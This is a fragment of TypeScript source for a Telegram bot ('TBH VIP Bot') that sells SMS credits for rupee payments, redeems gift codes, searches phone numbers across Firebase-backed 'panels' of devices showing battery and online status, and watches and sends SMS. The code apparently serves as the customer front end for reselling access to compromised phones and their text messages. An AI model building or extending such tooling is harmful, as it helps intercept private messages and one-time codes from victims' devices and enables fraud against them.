          `${em(E.lightning, "⚡")} 100 Credits — ₹49\n` +
          `${em(E.lightning, "⚡")} 500 Credits — ₹199\n` +
          `${em(E.lightning, "⚡")} 1000 Credits — ₹349\n` +
          `${em(E.lightning, "⚡")} 5000 Credits — ₹999\n\n` +
          `${em(E.history, "📋")} QR SCAN KARO → PAY KARO → SCREENSHOT DEVELOPER KO BHEJO.`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "💳 100 Credits — ₹49",   callback_data: "buy_100" },
                  { text: "💳 500 Credits — ₹199",  callback_data: "buy_500" },
                ],
                [
                  { text: "💳 1000 Credits — ₹349", callback_data: "buy_1000" },
                  { text: "💳 5000 Credits — ₹999", callback_data: "buy_5000" },
                ],
              ],
            },
          }
        );
        return;
      }

      if (text === "SUPPORT ( DEVELOPER )") {
        await send(
          chatId,
          `${em(E.support, "🖥")} <b>SUPPORT ( DEVELOPER )</b>\n` +
          `${divider()}\n\n` +
          `${em(E.sparkle, "✨")} Kisi bhi issue ke liye developer se contact karo:\n\n` +
          `${em(E.link, "🔗")} @TBH_BRAND`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === "BACK" || text === "CANCEL") {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
          `${em(E.home, "🏠")} <b>MAIN MENU</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      // ── State-based text inputs ──────────────────────────────────────────

      if (user.state === "search_number") {
        const searchNum = text.replace(/\D/g, "");
        if (searchNum.length < 7) {
          await send(chatId, "Please enter a valid phone number (min 7 digits).");
          return;
        }

        await send(chatId, `${em(E.search, "🔎")} <b>Searching...</b>`, { parse_mode: "HTML" });

        const panels = await db.select().from(panelsTable);
        let found = null;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          const match   = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
          if (match) { found = match; break; }
        }

        if (found) {
          await send(
            chatId,
            `${em(E.check, "✅")} <b>NUMBER FOUND!</b>\n${divider()}\n\n` +
            `${em(E.phone, "📱")} <b>Phone:</b> ${found.phoneNumber}\n` +
            `${em(E.db, "🗄")} <b>Panel:</b> ${found.panelName}\n` +
            `${em(E.battery, "🔋")} <b>Battery:</b> ${found.battery}\n` +
            `${em(E.online, "🟢")} <b>Status:</b> ${found.status ? "Online" : "Offline"}`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        } else {
          await send(
            chatId,
            `${em(E.offline, "🔴")} <b>Number ${text} not found in any panel.</b>`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "gift_card") {
        const code = text.toUpperCase().trim();
        const [card] = await db
          .select()
          .from(giftCardsTable)
          .where(and(eq(giftCardsTable.code, code)));

        if (!card) {
          await send(chatId, `${em(E.offline, "🔴")} <b>Invalid gift code.</b> Please try again.`, { parse_mode: "HTML" });
          return;
        }
        if (card.usedBy) {
          await send(chatId, `${em(E.offline, "🔴")} <b>This code has already been used.</b>`, { parse_mode: "HTML" });
          return;
        }

        const value      = parseInt(card.value, 10);
        let updateData: Partial<{ getNumberExpiresAt: Date; smsCredits: number }> = {};

        if (card.type === "hours") {
          const now    = new Date();
          const base   = user.getNumberExpiresAt ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime())) : now;
          updateData.getNumberExpiresAt = new Date(base.getTime() + value * 60 * 60 * 1000);
        } else if (card.type === "credits") {
          updateData.smsCredits = user.smsCredits + value;
        }

        await db.update(botUsersTable).set(updateData).where(eq(botUsersTable.id, user.id));
        await db.update(giftCardsTable).set({ usedBy: telegramId, usedAt: new Date() }).where(eq(giftCardsTable.id, card.id));

        const rewardMsg = card.type === "hours" ? `+${value} hours Get Number access` : `+${value} SMS credits`;
        await send(
          chatId,
          `${em(E.check, "✅")} <b>Gift code redeemed successfully!</b>\n\n${em(E.gift, "🎁")} Reward: <b>${rewardMsg}</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "send_sms") {
        if (text.includes("|")) {
          const [num, ...parts] = text.split("|");
          const phoneNum = num.trim().replace(/\D/g, "");
          const message  = parts.join("|").trim();

          if (!phoneNum || !message) {
            await send(chatId, "Invalid format. Use: NUMBER|MESSAGE");
            return;
          }

          await db
            .update(botUsersTable)
            .set({ smsCredits: Math.max(0, user.smsCredits - 1), state: "main_menu" })
            .where(eq(botUsersTable.id, user.id));

          await send(
            chatId,
            `${em(E.check, "✅")} <b>SMS QUEUED!</b>\n\n` +
            `${em(E.phone, "📱")} <b>To:</b> ${phoneNum}\n` +
            `${em(E.sms, "💬")} <b>Message:</b> ${message}\n\n` +
            `${em(E.credits, "💎")} Credits remaining: ${user.smsCredits - 1}`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }
        await send(chatId, "Format: NUMBER|MESSAGE\nExample: 9876543210|Hello");
        return;
      }

      // Default
      await send(
        chatId,
        `${em(E.home, "🏠")} <b>MAIN MENU</b>`,
        { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
      );
    } catch (err) {
      logger.error({ err, chatId }, "Bot message handler error");
      try { await send(chatId, "Something went wrong. Please try again."); } catch {}
    }
  });

  // ── Callback query (inline buttons) ───────────────────────────────────────
  bot.on("callback_query", async (query) => {
    if (!query.message || !query.from) return;
    const chatId     = query.message.chat.id;
    const telegramId = String(query.from.id);
    const data       = query.data || "";

    try {
      if (data === "check_joined") {
        let [user] = await db.select().from(botUsersTable).where(eq(botUsersTable.telegramId, telegramId));

        if (!user) {
          const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
          const [newUser] = await db.insert(botUsersTable).values({
            telegramId,
            username:     query.from.username || null,
            firstName:    query.from.first_name || "User",
            referralCode: generateReferralCode(telegramId),
            referredBy:   null,
            getNumberExpiresAt: expiresAt,
          }).returning();
          user = newUser;
        }

        await bot.answerCallbackQuery(query.id, { text: "✅ Verified! Welcome to TBH VIP Bot." });

        // Show inline verified message then send main menu
        await send(
          chatId,
          `${em(E.check, "✅")} <b>VERIFIED — BOT READY</b>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "✅ VERIFIED — BOT READY", callback_data: "noop" },
              ]],
            },
          }
        );

        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>BOT READY! USE THE BUTTONS BELOW.</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (data === "buy_100" || data === "buy_500" || data === "buy_1000" || data === "buy_5000") {
        const packages: Record<string, { credits: number; price: number }> = {
          buy_100:  { credits: 100,  price: 49 },
          buy_500:  { credits: 500,  price: 199 },
          buy_1000: { credits: 1000, price: 349 },
          buy_5000: { credits: 5000, price: 999 },
        };
        const pkg = packages[data];
        await bot.answerCallbackQuery(query.id, { text: `₹${pkg.price} ke liye UPI QR generate ho raha hai...` });
        await send(
          chatId,
          `${em(E.buy, "💳")} <b>PAYMENT DETAILS</b>\n${divider()}\n\n` +
          `${em(E.credits, "💎")} <b>Package:</b> ${pkg.credits} Credits\n` +
          `${em(E.money, "💰")} <b>Amount:</b> ₹${pkg.price}\n\n` +
          `${em(E.warn, "⚠️")} UPI QR screenshot developer ko bhejo after payment:\n` +
          `${em(E.link, "🔗")} @TBH_BRAND`,
          { parse_mode: "HTML" }
        );
        return;
      }

      if (data === "noop") {
        await bot.answerCallbackQuery(query.id);
        return;
      }

      await bot.answerCallbackQuery(query.id);
    } catch (err) {
      logger.error({ err }, "Callback query error");
    }
  });

  logger.info("Bot handlers set up");
}
